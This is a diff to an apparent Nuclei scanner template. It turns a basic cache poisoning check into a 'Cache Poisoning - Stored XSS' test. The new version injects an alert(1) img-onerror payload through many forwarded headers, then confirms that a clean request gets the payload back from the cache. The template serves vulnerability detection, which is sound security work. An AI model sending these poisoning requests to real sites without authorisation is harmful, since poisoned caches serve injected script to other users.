@@ -1,44 +1,50 @@
-id: cache-poisoning-1
+id: cache-poisoning-xss
 
 info:
-  name: Cache Poisoning Detection
-  author: erickfernandox
-  severity: low
-  tags: cache,generic
+  name: Cache Poisoning - Stored XSS
+  author: melbadry9,xelkomy,akincibor
+  severity: high
+  description: Cache Poisoning leads to Stored XSS.
+  reference:
+    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
+    - https://portswigger.net/research/practical-web-cache-poisoning
+    - https://portswigger.net/web-security/web-cache-poisoning
   metadata:
-    max-request: 3
-
+    max-request: 2
+  tags: cache,generic,xss
 variables:
   cache_key: "{{to_lower(rand_base(6))}}"
   cache_header: "{{to_lower(rand_base(6))}}"
+  xss_payload: '"><img src=x onerror=alert(1)>'
 
 http:
   - raw:
       - |
-        GET /?{{cache_key}}=9 HTTP/1.1
+        GET /?{{cache_key}}=1 HTTP/1.1
         Host: {{Hostname}}
         X-Host: {{cache_header}}.xfbc
-        X-Forwarded-Prefix: {{cache_header}}.xfp
-        X-Forwarded-Host: {{cache_header}}.xfh
-        X-Forwarded-For: {{cache_header}}.xff
-        X-Redirect-By: {{cache_header}}.xfcd
-        X-Forwarded-By: {{cache_header}}.xfn
-        x-forwarded-server: {{cache_header}}.xfo
-        X-Platform: {{cache_header}}.xfq
-        X-Powered-By: {{cache_header}}.xfr
-        X-Format: {{cache_header}}.xfs
-        X-Domain: {{cache_header}}.xfi
-        X-Original-Uri: {{cache_header}}.xfk
-        X-Device-OS: {{cache_header}}.xfy
-        X-Client: {{cache_header}}.xfz
-        X-Original-Uri: {{cache_header}}.xfab
-
+        X-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}
+        X-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}
+        X-Forwarded-For: {{cache_header}}.xff{{xss_payload}}
+        X-Redirect-By: {{cache_header}}.xfcd{{xss_payload}}
+        X-Forwarded-By: {{cache_header}}.xfn{{xss_payload}}
+        x-forwarded-server: {{cache_header}}.xfo{{xss_payload}}
+        X-Platform: {{cache_header}}.xfq{{xss_payload}}
+        X-Powered-By: {{cache_header}}.xfr{{xss_payload}}
+        X-Format: {{cache_header}}.xfs{{xss_payload}}
+        X-Domain: {{cache_header}}.xfi{{xss_payload}}
+        X-Original-Uri: {{cache_header}}.xfk{{xss_payload}}
+        X-Device-OS: {{cache_header}}.xfy{{xss_payload}}
+        X-Client: {{cache_header}}.xfz{{xss_payload}}
+        X-Original-Uri: {{cache_header}}.xfab{{xss_payload}}
 
       - |
-        GET /?{{cache_key}}=9 HTTP/1.1
+        GET /?{{cache_key}}=1 HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
       - type: dsl
         dsl:
-          - 'contains(body_2, cache_header)'
+          - contains(body_2, cache_header)
+          - contains(body_2, xss_payload)
+        condition: and
